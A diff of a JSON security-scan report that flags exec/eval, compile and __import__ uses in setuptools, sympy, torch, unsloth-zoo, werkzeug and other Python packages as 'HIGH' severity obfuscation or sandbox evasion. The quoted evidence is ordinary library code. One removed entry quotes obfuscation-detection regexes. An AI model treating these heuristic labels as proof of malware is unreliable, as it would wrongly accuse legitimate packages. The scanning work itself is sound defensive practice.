+      "evidence_hash": "86c78527d24076fed3bd03ca4f83ce7bef6c542f7536e4d3a8c74ae7f4dbd5d7"
     },
     {
       "package": "setuptools",
       "file": "setuptools/tests/config/test_pyprojecttoml.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L364: \"setup.py\": \"__import__('setuptools').setup(include_package_data=False)\",\nExec: L98: \"__main__.py\": \"def exec(): print('hello')\","
+      "evidence": "Obfusc: L364: \"setup.py\": \"__import__('setuptools').setup(include_package_data=False)\",\nExec: L98: \"__main__.py\": \"def exec(): print('hello')\",",
+      "evidence_hash": "54eba488d9224659312fe4e9c365311e11376801cab15866a6c92fca6bf0fae7"
     },
     {
       "package": "setuptools",
       "file": "setuptools/tests/test_editable_install.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L120: SETUP_SCRIPT_STUB = \"__import__('setuptools').setup()\"\nExec: L449: exec(finder, loc, loc)"
+      "evidence": "Obfusc: L120: SETUP_SCRIPT_STUB = \"__import__('setuptools').setup()\"\nExec: L449: exec(finder, loc, loc)",
+      "evidence_hash": "96207519402c0341024f8e9b9f885f67b679493da8c68f6d8e216486414d30d5"
     },
     {
       "package": "setuptools",
       "file": "setuptools/wheel.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L35: NAMESPACE_PACKAGE_INIT = \"__import__('pkg_resources').declare_namespace(__name__)\\n\"\nExec: L191: def eval(req, **env): | L212: (req for req in reqs if for_extra(req) and eval(req, extra=extra)),"
+      "evidence": "Obfusc: L35: NAMESPACE_PACKAGE_INIT = \"__import__('pkg_resources').declare_namespace(__name__)\\n\"\nExec: L191: def eval(req, **env): | L212: (req for req in reqs if for_extra(req) and eval(req, extra=extra)),",
+      "evidence_hash": "91fdd5553eb844e161737538b4fbd06346fe6ab3b5772ed902151ebf51ab480a"
     },
     {
       "package": "six",
       "file": "six.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L87: __import__(name)\nExec: L740: exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")"
+      "evidence": "Obfusc: L87: __import__(name)\nExec: L740: exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")",
+      "evidence_hash": "7234964b313eb3e164959cdca9251a7681b17a11df740dbc20b5b21d4164d3e7"
     },
     {
       "package": "sympy",
       "file": "sympy/external/importtools.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L145: mod = __import__(module, **import_kwargs) | L154: __import__(module + '.' + submod)\nExec: L21: return eval(debug_str)"
+      "evidence": "Obfusc: L145: mod = __import__(module, **import_kwargs) | L154: __import__(module + '.' + submod)\nExec: L21: return eval(debug_str)",
+      "evidence_hash": "21bab40426291b7efa2820c7503741346c51d827b70cddc5ca57d6e944433a25"
     },
     {
       "package": "sympy",
       "file": "sympy/plotting/experimental_lambdify.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L249: namespace.update({'math': __import__('math')}) | L251: namespace.update({'cmath': __import__('cmath')}) | L254: namespace.update({'np': __import__('numpy')})\nExec: L268: exec(\"MYNEWLAMBDA = %s\" % eval_str, namespace)"
+      "evidence": "Obfusc: L249: namespace.update({'math': __import__('math')}) | L251: namespace.update({'cmath': __import__('cmath')}) | L254: namespace.update({'np': __import__('numpy')})\nExec: L268: exec(\"MYNEWLAMBDA = %s\" % eval_str, namespace)",
+      "evidence_hash": "7a76ad28cc7d336089913683ca3bcc541a0552c6aa61d296f4b9a5864588dfe9"
     },
     {
       "package": "sympy",
       "file": "sympy/utilities/lambdify.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L919: c = compile(funcstr, filename, 'exec')\nExec: L163: module = eval(import_command) | L170: exec(import_command, {}, namespace) | L903: exec(ln, {}, namespace)"
+      "evidence": "Obfusc: L919: c = compile(funcstr, filename, 'exec')\nExec: L163: module = eval(import_command) | L170: exec(import_command, {}, namespace) | L903: exec(ln, {}, namespace)",
+      "evidence_hash": "e26e201e8d41d2d9341499957b6f0d6820e9b797ae30876255529986745349f1"
     },
     {
       "package": "tensorboard",
       "file": "tensorboard/plugins/projector/tf_projector_plugin/projector_binary.js",
       "check": "Python wheel ships large (1918 KB) JS bundle (uncommon; manually review)",
       "severity": "HIGH",
-      "evidence": ""
+      "evidence": "",
+      "evidence_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
     },
     {
       "package": "torch",
       "file": "torch/_dynamo/bytecode_debugger.py",
       "check": "Anti-analysis/sandbox evasion + suspicious behavior",
       "severity": "HIGH",
-      "evidence": "Anti: L1048: self._old_trace = sys.gettrace() | L1049: sys.settrace(self._settrace_callback) | L1106: sys.settrace(self._old_trace)"
+      "evidence": "Anti: L1048: self._old_trace = sys.gettrace() | L1049: sys.settrace(self._settrace_callback) | L1106: sys.settrace(self._old_trace)",
+      "evidence_hash": "3ded8be2b0e09fc973aa6fad60bd3fddea954314a731b1f4553d444d9259d10a"
     },
     {
       "package": "torch",
       "file": "torch/_functorch/_aot_autograd/subclass_codegen.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L342: code = compile(source, f\"<{artifact_name}>\", \"exec\")\nExec: L344: exec(code, globals_dict, local_dict)"
+      "evidence": "Obfusc: L342: code = compile(source, f\"<{artifact_name}>\", \"exec\")\nExec: L344: exec(code, globals_dict, local_dict)",
+      "evidence_hash": "a5a580062e9bc386fce0f13eeac006e04eaddb6784a1a9b9a8475d716cc5447d"
     },
     {
       "package": "torch",
       "file": "torch/fx/experimental/rewriter.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L46: code = compile(dest_ast, \"\", \"exec\")\nExec: L49: exec(code, globals_dict)"
+      "evidence": "Obfusc: L46: code = compile(dest_ast, \"\", \"exec\")\nExec: L49: exec(code, globals_dict)",
+      "evidence_hash": "98c37c5e69a195c61ef653b6ab92f57ff0086eba1c3101bae8d62ba686c47003"
     },
     {
       "package": "torch",
       "file": "torch/fx/graph_module.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L106: exec(compile(src, key, \"exec\"), globals)\nExec: L106: exec(compile(src, key, \"exec\"), globals)"
+      "evidence": "Obfusc: L106: exec(compile(src, key, \"exec\"), globals)\nExec: L106: exec(compile(src, key, \"exec\"), globals)",
+      "evidence_hash": "ca8f190dbec805c0466ef92507cea3182f562e99c4d70150c89c818bdae3a427"
     },
     {
       "package": "torch",
       "file": "torch/package/package_importer.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L602: def __import__(self, name, globals=None, locals=None, fromlist=(), level=0):\nExec: L412: exec(code, ns)"
+      "evidence": "Obfusc: L602: def __import__(self, name, globals=None, locals=None, fromlist=(), level=0):\nExec: L412: exec(code, ns)",
+      "evidence_hash": "050fa3085522bfec203f1625184e2f9fc81f311774b5819b1ea947fdbaaff449"
     },
     {
       "package": "triton",
       "file": "triton/runtime/interpreter.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L1435: compiled_code = compile(transformed_ast, filename=self.filename, mode='exec')\nExec: L1441: exec(compiled_code, fn_globals, local_namespace)"
-    },
-    {
-      "package": "unsloth-zoo",
-      "file": "scripts/scan_packages.py",
-      "check": "exec/eval with payload hidden in a docstring/string",
-      "severity": "HIGH",
-      "evidence": "marshal/compile/obfuscation: L132: r\"|\\bbytearray\\s*\\(\\s*\\[.*?\\]\\s*\\)\"  # bytearray([104,101,...]) | L135: r\"|\\bgetattr\\s*\\(\\s*__builtins__\"  # getattr(__builtins__, ...)"
+      "evidence": "Obfusc: L1435: compiled_code = compile(transformed_ast, filename=self.filename, mode='exec')\nExec: L1441: exec(compiled_code, fn_globals, local_namespace)",
+      "evidence_hash": "b69ad9ac9a5015d79a735671b6136fa1db30f29a63571be91def633e1ddc3319"
     },
     {
       "package": "unsloth-zoo",
       "file": "tests/test_compiler_dynamic_exec.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L126: code = compile(source, f\"<{entry_point}>\", \"exec\")\nExec: L134: exec(code, sandbox)"
+      "evidence": "Obfusc: L126: code = compile(source, f\"<{entry_point}>\", \"exec\")\nExec: L134: exec(code, sandbox)",
+      "evidence_hash": "79387dd9253c6635d2f3a9d82e86314707e87141c08f9a14158b1f119ed776db"
     },
     {
       "package": "unsloth-zoo",
       "file": "tests/test_fused_forward_install.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L268: code = compile(src, fake_path, \"exec\")\nExec: L269: exec(code, namespace)"
+      "evidence": "Obfusc: L268: code = compile(src, fake_path, \"exec\")\nExec: L269: exec(code, namespace)",
+      "evidence_hash": "972a7600ec2467ea7bc367a7a225e7b455ad0f1d374f67f1ab18948c65cf94dd"
+    },
+    {
+      "package": "unsloth-zoo",
+      "file": "tests/test_mlx_trainer_internals.py",
+      "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
+      "severity": "HIGH",
+      "evidence": "Obfusc: L430: assert ppl == pytest.approx(__import__(\"math\").exp(2.5))\nExec: L408: def eval(self):",
+      "evidence_hash": "e81652cb3ddc5a327bbe37348a328edf4b72d06f23f4e638e269aa459bcc191c"
     },
     {
       "package": "unsloth-zoo",
       "file": "tests/test_upstream_pinned_symbols_trl_vllm.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L379: mod = __import__(modpath, fromlist=[\"Logprob\"])\nExec: L238: \"unsloth_zoo dispatch via `eval(f'trl.trainer.{trainer_file}.{name}')` breaks\""
+      "evidence": "Obfusc: L379: mod = __import__(modpath, fromlist=[\"Logprob\"])\nExec: L238: \"unsloth_zoo dispatch via `eval(f'trl.trainer.{trainer_file}.{name}')` breaks\"",
+      "evidence_hash": "f6f1defc08089bfc4a8193e19e62e5c70ebdf46818bff3b6ee0dde7c4bca3505"
     },
     {
       "package": "unsloth-zoo",
       "file": "unsloth_zoo/compiler.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L1013: _mod = __import__(model_location, fromlist=items) | L4291: f\"   {chr(92)}{chr(92)}   /|    Num examples = {num_examples:,} | Num Epochs = {num_train_epochs:,} | Total steps = {max_steps:,}\\\\n\"\\\\ | L4292: f\"O^O/ {chr(92)}_/ {c"
+      "evidence": "Obfusc: L1013: _mod = __import__(model_location, fromlist=items) | L4291: f\"   {chr(92)}{chr(92)}   /|    Num examples = {num_examples:,} | Num Epochs = {num_train_epochs:,} | Total steps = {max_steps:,}\\\\n\"\\\\ | L4292: f\"O^O/ {chr(92)}_/ {chr(92)}    Batch size per device = {self._train_batch_size:,} | Gradient accumulation steps = {args.gradient_accumulation_steps}\\\\n\"\\\\\nExec: L612: if eval(_dtype) is not None: | L613: dtype = eval(_dtype) | L955: _modeling_file = eval(model_location)",
+      "evidence_hash": "887defdaebc77ff700cba372f28b01ca379778b6ae7c15622c09ad3d0fb39c42"
     },
     {
       "package": "unsloth-zoo",
       "file": "unsloth_zoo/fused_losses/forward_install.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L274: code = compile(new_src, synthetic_path, \"exec\")\nExec: L275: exec(code, ns)"
+      "evidence": "Obfusc: L274: code = compile(new_src, synthetic_path, \"exec\")\nExec: L275: exec(code, ns)",
+      "evidence_hash": "eabb84fa7416fb64d45175605138b30dce2af8fc9089b92cefa819bea3ed5dc3"
     },
     {
       "package": "unsloth-zoo",
       "file": "unsloth_zoo/mlx/loader.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L1739: _mod = __import__(module_name, fromlist=[\"_\"])\nExec: L141: mx.eval(model.parameters()) | L1543: model.eval() | L2126: mx.eval(model.parameters())"
+      "evidence": "Obfusc: L2218: _mod = __import__(module_name, fromlist=[\"_\"])\nExec: L140: mx.eval(model.parameters()) | L176: mx.eval(model.parameters()) | L2022: model.eval()",
+      "evidence_hash": "88c5ed2d2e218058320c0d3d83f47d69aeffb9b5a8670d4a69a46629ddd1d782"
     },
     {
       "package": "unsloth-zoo",
       "file": "unsloth_zoo/patching_utils.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L706: compile(new_source, '<temp_patched>', 'exec')\nExec: L221: try:    exec(_try_compile_argument) | L226: try:    exec(_try_dynamo_argument) | L570: exec(\"from torch._dynamo.compiled_autograd import (\" + \", \".join(x for x in good_"
+      "evidence": "Obfusc: L706: compile(new_source, '<temp_patched>', 'exec')\nExec: L221: try:    exec(_try_compile_argument) | L226: try:    exec(_try_dynamo_argument) | L570: exec(\"from torch._dynamo.compiled_autograd import (\" + \", \".join(x for x in good_items) + \")\", globals())",
+      "evidence_hash": "b3b07cf3dbd010c9aaa27974779aa6fece2f74e3b8f8cc1f58718c00c01e42b0"
     },
     {
       "package": "unsloth-zoo",
       "file": "unsloth_zoo/saving_utils.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L3078: module = __import__('transformers', fromlist=[model_class_name])\nExec: L2960: exec(f\"from transformers.modeling_utils import ({', '.join(functions)})\", locals(), globals()) | L3006: exec(save_pretrained, globals(), functions)"
+      "evidence": "Obfusc: L3040: module = __import__('transformers', fromlist=[model_class_name])\nExec: L2922: exec(f\"from transformers.modeling_utils import ({', '.join(functions)})\", locals(), globals()) | L2968: exec(save_pretrained, globals(), functions)",
+      "evidence_hash": "86abad0fa73dba52306e1124103b130a7d60818751d544ee646aeafcfff6ab64"
     },
     {
       "package": "werkzeug",
       "file": "werkzeug/routing/rules.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L836: code = compile(module, \"<werkzeug routing>\", \"exec\")\nExec: L736: exec(code, globs, locs)"
+      "evidence": "Obfusc: L836: code = compile(module, \"<werkzeug routing>\", \"exec\")\nExec: L736: exec(code, globs, locs)",
+      "evidence_hash": "6d0d55a15dc5524409e43e24ec62ad9468341153edd00f667389c3c587432894"
     }
   ]
 }
